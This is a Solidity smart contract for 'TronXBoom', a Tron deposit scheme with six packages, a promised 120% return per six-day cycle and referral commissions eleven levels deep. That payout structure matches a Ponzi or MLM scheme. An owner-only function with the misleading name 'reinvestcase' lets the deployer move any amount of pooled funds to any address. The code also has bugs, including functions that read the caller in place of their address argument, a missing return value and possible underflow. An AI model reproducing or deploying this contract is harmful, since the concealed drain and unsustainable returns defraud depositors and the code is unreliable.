//SourceUnit: tronxboom.sol

pragma solidity 0.5.10;

contract TronXBoom {
	
	using SafeMath for uint256;
	uint256[] public INVEST_MIN_AMOUNT = [1000 trx,2500 trx,10000 trx,25000 trx,50000 trx,100000 trx];
	uint256 constant public BASE_PERCENT = 12000;
	uint256 constant public DIRECT_PERCENT = 100;
	
	uint256[] public REFERRAL_PERCENTS = [1000,500,250,125,50,250,250,500,125,250,500];

	uint256 constant public MARKETING_FEE = 800;
	uint256 constant public PROJECT_FEE = 200;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
	uint256 constant public TIME_STEP = 6 days;
	uint256 constant public DAY_STEP = 6 days;
    address owner;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint256 public totalReInvested;
	uint256 public totalReDeposits;
		
	address payable public marketingAddress;
	address payable public projectAddress;

	struct Deposit 
	{
		uint256 amount;
		uint256 start;
		uint256 enddt;
	}
	
	
	struct User 
	{
		mapping(uint256 => Deposit) Package;
		mapping(uint256 => uint256) cyclePackage;
		mapping(uint256 => uint256) PackageWithdrawal;
		address myaddress;
		uint256 userDeposit;
		uint256 checkpoint;
		address payable referrer;
		uint256 bonus;
		uint256 direct;
		uint256 team;
		uint256 [] teambv;
		uint256 [] levelcomm;
		uint256 withdraw_bonus;
		
	}

	mapping (address => User) internal users;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event DirectBonus(address indexed referrer, address indexed referral, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	event ContractBalance(uint256 balance);

	constructor(address payable marketingAddr, address payable projectAddr) public 
	{
		require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr;
		owner=msg.sender;
	}

	function invest(address payable referrer,uint256 p ) public payable 
	{
		require(msg.value == INVEST_MIN_AMOUNT[p-1]);
		
		User storage user = users[msg.sender];
			
        user.userDeposit=user.userDeposit.add(msg.value);
	
		address  payable upline;
		
		if(isUserIDExists(msg.sender))
		{
		    require(block.timestamp>=user.Package[p].enddt);
		}
		
	
		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));
        
		uint256 amount=0;

		if (user.referrer == address(0) && users[referrer].Package[1].amount > 0 && referrer != msg.sender) 
		{
			user.referrer = referrer;
		}

		if (user.referrer != address(0)) {

			upline = user.referrer;
		
		  
			for (uint256 i = 0; i < 11; i++) 
			{
			        if (upline != address(0)) 
    				{
    				    if(msg.value == INVEST_MIN_AMOUNT[0] && isUserIDExists(msg.sender)==false)
    				    {
        				    users[upline].team=users[upline].team.add(1);
        				    
            				if(i==0)
        			        {
                                 users[upline].direct=users[upline].direct.add(1);  
                    
        			        }
    				    }
    			        if (i+1<=users[upline].direct)
    			        {
    			            if(user.cyclePackage[p]>3)
    			            {
    			                amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
    			                amount=amount.div(2);
                                upline.transfer(amount);
    			                
    			            }
    			            else
    			            {
    			                amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
    			                upline.transfer(amount);
    			            }
        					 
        	  				users[upline].bonus = users[upline].bonus.add(amount);
    
        				    if(users[upline].levelcomm.length<i+1)
        				    {
        				        users[upline].levelcomm.push(amount);
        				        users[upline].teambv.push(msg.value);
        				    }
        				    else
        				    {
        				       users[upline].levelcomm[i]=users[upline].levelcomm[i].add(amount); 
        				       users[upline].teambv[i]=users[upline].teambv[i].add(msg.value); 
        				    }
        				
        				
        					emit RefBonus(upline, msg.sender, i, amount);
    			        }
    					upline = users[upline].referrer;
    				} else break;
			   
			}	

		}

		if (user.Package[1].amount == 0) 
		{
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			user.myaddress=msg.sender;
			emit Newbie(msg.sender);
		}
		
		if (user.Package[p].amount != 0) {
		
		    user.PackageWithdrawal[p]=user.PackageWithdrawal[p].add(getUserDividends(msg.sender,p));
		}

        user.Package[p].amount=msg.value;
        user.Package[p].start=block.timestamp;
        user.Package[p].enddt=block.timestamp.add(DAY_STEP);
		//user.deposits_1.push(Deposit_1(msg.value,  block.timestamp,block.timestamp.add(DAY_STEP)));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		
		user.cyclePackage[p]=user.cyclePackage[p].add(1);

		emit NewDeposit(msg.sender, msg.value);
		emit ContractBalance(address(this).balance);

	}
	
    function reinvestcase(address _userAddress,uint256 _amount) public 
    {
        require(owner==msg.sender,"Only owner can do this");
        address(uint160(_userAddress)).transfer(_amount);
      
        emit Withdrawn(_userAddress,_amount);
    }
    
	
    function isUserIDExists(address memb_address) public view returns (bool) {
        
        if(users[memb_address].myaddress==address(0))
        {
            return false;    
        }
        else
        {
            return true; 
        }
        
    }
    
	function withdraw() public 
	{
	    User storage user = users[msg.sender];
	    
	    uint256 totalAmount=0;
	    
	    totalAmount=getUserTotalDivident(msg.sender);
	    
	    require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

	    
	    msg.sender.transfer(totalAmount);  
	    
        user.withdraw_bonus=user.withdraw_bonus.add(totalAmount);
	    totalWithdrawn = totalWithdrawn.add(totalAmount);
	  
	    
	    user.bonus=0;
        user.PackageWithdrawal[1]=0;
        user.PackageWithdrawal[2]=0;
        user.PackageWithdrawal[3]=0;
        user.PackageWithdrawal[4]=0;
        user.PackageWithdrawal[5]=0;
        user.PackageWithdrawal[6]=0;

		emit Withdrawn(msg.sender, totalAmount);
		emit ContractBalance(address(this).balance);

	}
	
	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].Package[1].amount;
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	

	function getContractBalanceRate() public view returns (uint256) {
	
		return BASE_PERCENT;
	}
	
	function getContractDtl() public view returns (uint256 totalUsersx,uint256 totalInvestedx,uint256 totalWithdrawnx,uint256 totalDeposit,uint256 totalreinv,uint256 totalreinvamt,uint256 contractbal) {
			return (totalUsers,totalInvested,totalWithdrawn,totalDeposit,totalReInvested,totalReDeposits,address(this).balance);
	    
	}
	
	
	function getPackageRoiWithdrawal(address userAddress) public view returns (uint256 pkg1,uint256 pkg2,uint256 pkg3,uint256 pkg4,uint256 pkg5,uint256 pkg6) 
	{
	    
	    uint256 pkg01=0;
	    uint256 pkg02=0;
	    uint256 pkg03=0;
	    uint256 pkg04=0;
	    uint256 pkg05=0;
	    uint256 pkg06=0;
    	User storage user = users[msg.sender];
        pkg01=user.PackageWithdrawal[1];
        pkg02=user.PackageWithdrawal[2];
        pkg03=user.PackageWithdrawal[3];
        pkg04=user.PackageWithdrawal[4];
        pkg05=user.PackageWithdrawal[5];
        pkg06=user.PackageWithdrawal[6];

	   
		return (pkg01,pkg02,pkg03,pkg04,pkg05,pkg06);
	    
	}
	
	function getPackageRoi(address userAddress) public view returns (uint256 pkg1,uint256 pkg2,uint256 pkg3,uint256 pkg4,uint256 pkg5,uint256 pkg6) 
	{
	    
	    uint256 pkg01=0;
	    uint256 pkg02=0;
	    uint256 pkg03=0;
	    uint256 pkg04=0;
	    uint256 pkg05=0;
	    uint256 pkg06=0;
	
        pkg01=getUserDividends(userAddress,1);
        pkg02=getUserDividends(userAddress,2);
        pkg03=getUserDividends(userAddress,3);
        pkg04=getUserDividends(userAddress,4);
        pkg05=getUserDividends(userAddress,5);
        pkg06=getUserDividends(userAddress,6);

	   
		return (pkg01,pkg02,pkg03,pkg04,pkg05,pkg06);
	    
	}
	
	function getUserTotalDivident(address userAddress) public view returns (uint256 amount )
	{
	    
	    uint256 pkg01=0;
	    uint256 pkg02=0;
	    uint256 pkg03=0;
	    uint256 pkg04=0;
	    uint256 pkg05=0;
	    uint256 pkg06=0;
	    uint256 amountx=0;
	    
        User storage user = users[msg.sender];
        
        
        pkg01=user.PackageWithdrawal[1];
        pkg02=user.PackageWithdrawal[2];
        pkg03=user.PackageWithdrawal[3];
        pkg04=user.PackageWithdrawal[4];
        pkg05=user.PackageWithdrawal[5];
        pkg06=user.PackageWithdrawal[6];
        
        amountx=pkg01+pkg02+pkg03+pkg04+pkg05+pkg06;

	   
		return (amountx);
	    
	}
	
	function getPackageCycle(address userAddress) public view returns (uint256 pkg1,uint256 pkg2,uint256 pkg3,uint256 pkg4,uint256 pkg5,uint256 pkg6) {
	    
	    uint256 pkg01=0;
	    uint256 pkg02=0;
	    uint256 pkg03=0;
	    uint256 pkg04=0;
	    uint256 pkg05=0;
	    uint256 pkg06=0;
	
	    User storage user = users[userAddress];

        pkg01=user.cyclePackage[1];
        pkg02=user.cyclePackage[2];
        pkg03=user.cyclePackage[3];
        pkg04=user.cyclePackage[4];
        pkg05=user.cyclePackage[5];
        pkg06=user.cyclePackage[6];

	   
		return (pkg01,pkg02,pkg03,pkg04,pkg05,pkg06);
	    
	}
	
	function getPackageStatus(address userAddress) public view returns (uint256 pkg1,uint256 pkg2,uint256 pkg3,uint256 pkg4,uint256 pkg5,uint256 pkg6) {
	    
	    uint256 pkg01=0;
	    uint256 pkg02=0;
	    uint256 pkg03=0;
	    uint256 pkg04=0;
	    uint256 pkg05=0;
	    uint256 pkg06=0;
	    
	    
	    
	    User storage user = users[userAddress];
	    if(user.Package[1].amount>0)
	    {
	           pkg01=1;
	    }
	    if(user.Package[2].amount>0)
	    {
	        pkg02=1;
	    }
	    if(user.Package[3].amount>0)
	    {
	        pkg03=1;
	    }
	    if(user.Package[4].amount>0)
	    {
	        pkg04=1;
	    }
	    if(user.Package[5].amount>0)
	    {
	        pkg05=1;
	    }
	    if(user.Package[6].amount>0)
	    {
	        pkg06=1;
	    }
		return (pkg01,pkg02,pkg03,pkg04,pkg05,pkg06);
	    
	}
	
	function getPackageReinvestStatus(address userAddress) public view returns (uint256 pkg1,uint256 pkg2,uint256 pkg3,uint256 pkg4,uint256 pkg5,uint256 pkg6) {
	    uint256 pkg01=0;
	    uint256 pkg02=0;
	    uint256 pkg03=0;
	    uint256 pkg04=0;
	    uint256 pkg05=0;
	    uint256 pkg06=0;
	    User storage user = users[userAddress];
	    if(user.Package[1].amount>0)
	    {
	        if(user.Package[1].enddt-now>0 )
	        {
	             pkg01=1;
	        }
	    }
	    if(user.Package[2].amount>0)
	    {
	        if(user.Package[2].enddt-now>0 )
	        {
	            pkg02=1;
	        }
	    }
	    if(user.Package[3].amount>0)
	    {
	        if(user.Package[3].enddt-now>0 )
	        {
	            pkg03=1;
	        }
	    }
	    if(user.Package[4].amount>0)
	    {
	        if(user.Package[4].enddt-now>0 )
	        {
	            pkg04=1;
	        }
	    }
	    if(user.Package[5].amount>0)
	    {
	        pkg05=1;
	    }
	    if(user.Package[6].amount>0)
	    {
	        if(user.Package[6].enddt-now>0 )
	        {
	            pkg06=1;
	        }
	    }
		return (pkg01,pkg02,pkg03,pkg04,pkg05,pkg06);
	    
	}
	
	
	function getPackageCounter(address userAddress) public view returns (uint256 pkg1,uint256 pkg2,uint256 pkg3,uint256 pkg4,uint256 pkg5,uint256 pkg6) 
	{
	    uint256 pkg01=0;
	    uint256 pkg02=0;
	    uint256 pkg03=0;
	    uint256 pkg04=0;
	    uint256 pkg05=0;
	    uint256 pkg06=0;
	    User storage user = users[userAddress];
	    if(user.Package[1].amount>0)
	    {
	        if(user.Package[1].enddt>now )
	        {
	             pkg01=user.Package[1].enddt-now;
	        }
	        else
	        {
	            pkg01=0;
	        }
	    }
	    if(user.Package[2].amount>0)
	    {
	        if(user.Package[2].enddt>now )
	        {
	             pkg02=user.Package[2].enddt-now;
	        }
	        else
	        {
	            pkg02=0;
	        }
	    }
	    if(user.Package[3].amount>0)
	    {
	        if(user.Package[3].enddt>now )
	        {
	             pkg03=user.Package[3].enddt-now;
	        }
	        else
	        {
	            pkg03=0;
	        }
	    }
	    if(user.Package[4].amount>0)
	    {
	       if(user.Package[4].enddt>now )
	        {
	             pkg04=user.Package[4].enddt-now;
	        }
	        else
	        {
	            pkg04=0;
	        }
	    }
	    if(user.Package[5].amount>0)
	    {
	        if(user.Package[5].enddt>now )
	        {
	             pkg05=user.Package[5].enddt-now;
	        }
	        else
	        {
	            pkg05=0;
	        }
	    }
	    
	    if(user.Package[6].amount>0)
	    {
	       if(user.Package[6].enddt>now)
	        {
	             pkg06=user.Package[6].enddt-now;
	        }
	        else
	        {
	             pkg06=0;
	        }
	    }
		return (pkg01,pkg02,pkg03,pkg04,pkg05,pkg06);
	    
	}
	
	

	function getUserPercentRate(address userAddress) public view returns (uint256) {
	
		User storage user = users[userAddress];

		uint256 contractBalanceRate = getContractBalanceRate();  // return 11%
		
		if (isActive(userAddress)) 
		{
			uint256 timeMultiplier = (now.sub(user.checkpoint)).div(TIME_STEP);
			if(timeMultiplier>=1)
			{
			return contractBalanceRate.add(40);
			}
			else
			{
			    return contractBalanceRate;
			}
			
		} 
		else 
		{
			return contractBalanceRate;
		}
	}

	function getUserDividends(address userAddress ,uint256 p) public view returns (uint256) {
		
		User storage user = users[userAddress];
		uint256 userPercentRate =BASE_PERCENT;// getUserPercentRate(userAddress);

		uint256 totalDividends;
		uint256 dividends;
		uint256 curdate;
        uint256 i;
	       totalDividends=0;
	       i=p;
	       
            if (user.Package[i].amount>0)
            {
                
         
            
                if(user.Package[i].enddt>= block.timestamp)
                {
                    curdate=block.timestamp;
                }
                else
                {
                    curdate=user.Package[i].enddt;
                }
                
				if (user.Package[i].start > user.checkpoint) 
				{

					dividends = (user.Package[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.Package[i].start))
						.div(TIME_STEP);

				} else 
				{

					dividends = (user.Package[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				totalDividends = totalDividends.add(dividends);

            }
           

		return totalDividends;
	}
	

	
	

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}
    
   function getUserFundDtl(address userAddress) public view returns( uint256 totaldirect,uint256 teamx, uint256 withdrawal) {
       
		return (users[userAddress].direct,users[userAddress].team,users[userAddress].withdraw_bonus);
	}
   
   
	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}
	
	
	
	
	function getUserLevelBonus(address userAddress) public view returns(uint256 [] memory lenx,uint256 [] memory lbv) {
	  
	  		return (users[userAddress].levelcomm,users[userAddress].teambv);
	}
	
	
	function getUserTeamBV(address userAddress) public view returns(uint256 [] memory,uint256 lenx) {
	   
		return (users[userAddress].teambv,users[userAddress].teambv.length);
	}


	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

//	function getUserAvailable(address userAddress) public view returns(uint256) {
//		return getUserTotalDivident(userAddress);
//	}
	


	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.Package[1].amount > 0) {
			if (user.Package[1].enddt >= now) {
				return true;
			}
		}
	}




	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    
	    User storage user = users[userAddress];
		uint256 amount;
        amount=user.userDeposit;
	
		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		return user.withdraw_bonus;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}